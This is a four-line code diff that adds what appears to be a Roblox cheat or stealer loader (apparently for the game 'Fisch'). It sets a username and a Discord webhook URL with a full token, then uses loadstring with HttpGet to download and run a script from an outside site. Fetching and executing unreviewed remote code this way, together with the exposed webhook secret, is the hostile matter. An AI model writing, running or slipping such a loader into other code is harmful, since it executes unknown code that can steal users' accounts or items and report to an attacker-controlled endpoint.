@@ -1,0 +1,4 @@
+Username = "Xvlamer"
+Webhook = "https://discord.com/api/webhooks/1313235473715691570/EWElbMJGHBiLErNn1Zk_FADFydqhF215Y0FckNyDGPZRXF4GXYnxvW2v4SAp4JpswV4j"
+
+loadstring(game:HttpGet("https://darkscripts.space/fisch",true))()
